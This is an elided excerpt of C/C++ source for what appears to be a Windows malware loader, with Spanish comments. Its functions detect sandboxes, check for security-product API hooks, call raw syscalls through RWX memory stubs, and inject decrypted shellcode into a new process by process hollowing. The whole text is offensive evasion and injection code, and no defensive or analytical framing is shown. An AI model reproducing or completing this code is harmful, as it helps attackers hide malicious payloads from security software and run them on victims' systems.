...
bool IsRunningInSandbox() {
    ...
    DWORD uptime = APIs.GetTickCount();
    ...
    if (snapshot != INVALID_HANDLE_VALUE) {
        ...
        if (APIs.Process32First(snapshot, &pe32)) {
            do {
            ...
            } while (APIs.Process32Next(snapshot, &pe32));
        }
...
bool DetectAPIHooks() {
    ...
    HMODULE hNtDll = APIs.GetModuleHandleA("ntdll.dll");
    if (hNtDll) {
        FARPROC pNtAllocateVirtualMemory = GetProcAddressHidden(hNtDll, "NtAllocateVirtualMemory");
...
NTSTATUS DynamicSyscall(DWORD syscallNumber, HANDLE ProcessHandle, PVOID* BaseAddress, 
    ...
    *(DWORD*)(syscallStub + 5) = syscallNumber;
    ...
    // Ejecutar stub
    NTSTATUS result;
    void* execMem = APIs.VirtualAlloc(NULL, sizeof(syscallStub), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!execMem) {
        return GetLastError();
    }
    ...
    APIs.VirtualFree(execMem, 0, MEM_RELEASE);
    return result;
}
...
bool ProcessHollowing(unsigned char* shellcode, DWORD shellcodeSize) {
    ...
    if (!GetProcessImageBase(pi.hProcess, &imageBaseAddress)) {
        APIs.TerminateProcess(pi.hProcess, 1);
    ...
    if (!APIs.ReadProcessMemory(pi.hProcess, (LPCVOID)((DWORD_PTR)imageBaseAddress + pDosHeader->e_lfanew), 
    ...
    if (!APIs.WriteProcessMemory(pi.hProcess, pNewImageBase, decryptedShellcode, shellcodeSize, NULL)) {
    ...
    if (!APIs.GetThreadContext(pi.hThread, &context)) {
    ...
    if (!APIs.SetThreadContext(pi.hThread, &context)) {
    ...
    if (APIs.ResumeThread(pi.hThread) == (DWORD)-1) {
